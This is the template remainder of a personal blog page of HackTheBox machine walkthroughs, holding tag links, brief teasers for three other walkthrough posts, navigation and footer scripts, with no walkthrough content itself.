    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/HackTheBox-Walkthrough-Photobomb/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Photobomb</p>
  </a>
  

  
  <a href="/posts/HackTheBox-Walkthrough-Mentor/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Mentor</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

